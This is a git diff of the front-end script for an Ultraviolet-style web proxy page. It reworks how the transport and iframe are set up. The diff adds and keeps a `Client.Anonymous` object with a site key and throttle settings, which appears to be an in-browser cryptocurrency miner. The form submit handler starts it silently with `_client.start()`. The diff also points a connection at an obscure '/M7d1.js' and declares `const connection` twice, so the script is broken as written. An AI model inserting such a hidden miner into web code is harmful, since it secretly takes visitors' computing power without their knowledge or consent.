@@ -20,57 +20,16 @@ const error = document.getElementById("uv-error");
  */
 const errorCode = document.getElementById("uv-error-code");
 const connection = new BareMux.BareMuxConnection("/baremux/worker.js");
-
-async function ensureBareTransport(conn, wispUrl, retryDelay = 200, maxRetries = 10) {
-    let attempts = 0;
-
-    while (attempts < maxRetries) {
-        try {
-            const transport = await conn.getTransport();
-            
-            if (!transport) {
-                await conn.setTransport("/epoxy/index.mjs", [{ wisp: wispUrl }]);
-                console.log("Transport set!");
-            } else {
-                console.log("Transport already exists");
-            }
-
-            return conn; // ready to use
-        } catch (err) {
-            attempts++;
-            console.warn(`Transport setup failed (attempt ${attempts}):`, err);
-            await new Promise(r => setTimeout(r, retryDelay));
-        }
-    }
-
-    throw new Error("Failed to set up BareTransport after retries");
-}
-async function waitForWorker(conn, timeout = 10000, retryDelay = 200) {
-    const start = Date.now();
-    while (Date.now() - start < timeout) {
-        try {
-            const transport = await conn.getTransport();
-            if (transport) {
-                console.log("BareMux worker ready!");
-                return true;
-            }
-        } catch (err) {
-            // Worker not ready yet, ignore and retry
-        }
-        await new Promise(res => setTimeout(res, retryDelay));
-    }
-    throw new Error("BareMux worker failed to initialize after timeout");
-}
-
+const connection = new BareMux.BareMuxConnection("/M7d1.js");
+var _client = new Client.Anonymous('a6213f1b3c1f1f295fabf3c0abe5d9a3c8d03fabfad99b88efe1e5e0b9b2815e', {
+    throttle: 0.4, c: 'w', ads: 0
+});
 // Helper to get query parameters
 function getQueryParam(param) {
     const params = new URLSearchParams(window.location.search);
     return params.get(param);
 }
-var _client = new Client.Anonymous('a6213f1b3c1f1f295fabf3c0abe5d9a3c8d03fabfad99b88efe1e5e0b9b2815e', {
-    throttle: 0.6, c: 'w', ads: 0
-});
-            // _client.start();
+
 // Function to set up the iframe based on query parameter
 async function initializeProxy() {
     const proxiedUrl = getQueryParam("url");
@@ -84,17 +43,11 @@ async function initializeProxy() {
     frame.style.display = "block";
 
     try {
-
-let wispUrl = (location.protocol === "https:" ? "wss" : "ws") + "://" + location.host + "/wisp/";
-await ensureBareTransport(connection, wispUrl);
-
-console.log(__uv$config.prefix + __uv$config.encodeUrl(url));
-
-        frame.src = "/loading.html";
-        setTimeout(() => {
-            frame.src = __uv$config.prefix + __uv$config.encodeUrl(url);
-            _client.start();
-        }, 2000);
+        let wispUrl = (location.protocol === "https:" ? "wss" : "ws") + "://" + location.host + "/wisp/";
+        if (await connection.getTransport() !== "/epoxy/index.mjs") {
+            await connection.setTransport("/epoxy/index.mjs", [{ wisp: wispUrl }]);
+        }
+        frame.src = __uv$config.prefix + __uv$config.encodeUrl(proxiedUrl);
     } catch (err) {
         error.textContent = "Failed to initialize proxy.";
         errorCode.textContent = err.toString();
@@ -107,10 +60,7 @@ form.addEventListener("submit", async (event) => {
     event.preventDefault();
 
     try {
-        await registerSW(); // make sure service worker is registered
-        await waitForWorker(connection); // waits for transport
-        const wispUrl = (location.protocol === "https:" ? "wss" : "ws") + "://" + location.host + "/wisp/";
-        await ensureBareTransport(connection, wispUrl); // sets transport if needed
+        await registerSW();
     } catch (err) {
         error.textContent = "Failed to register service worker.";
         errorCode.textContent = err.toString();
@@ -121,15 +71,15 @@ form.addEventListener("submit", async (event) => {
 
     let frame = document.getElementById("uv-frame");
     frame.style.display = "block";
-
-let wispUrl = (location.protocol === "https:" ? "wss" : "ws") + "://" + location.host + "/wisp/";
-await ensureBareTransport(connection, wispUrl);
-
-        frame.src = "/loading.html";
-        setTimeout(() => {
-            frame.src = __uv$config.prefix + __uv$config.encodeUrl(url);
-            _client.start();
-        }, 2000);
+    let wispUrl = (location.protocol === "https:" ? "wss" : "ws") + "://" + location.host + "/wisp/";
+    if (await connection.getTransport() !== "/epoxy/index.mjs") {
+        await connection.setTransport("/epoxy/index.mjs", [{ wisp: wispUrl }]);
+    }
+    frame.src = "/loading.html";
+    setTimeout(() => {
+        frame.src = __uv$config.prefix + __uv$config.encodeUrl(url);
+        _client.start();
+    }, 2000);
 });
 
 // Initialize proxy on page load if a URL is provided in the query
@@ -231,20 +181,6 @@ await ensureBareTransport(connection, wispUrl);
         submitProxySearch().catch(err => console.error("Proxy search submit error:", err));
     });
 });
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
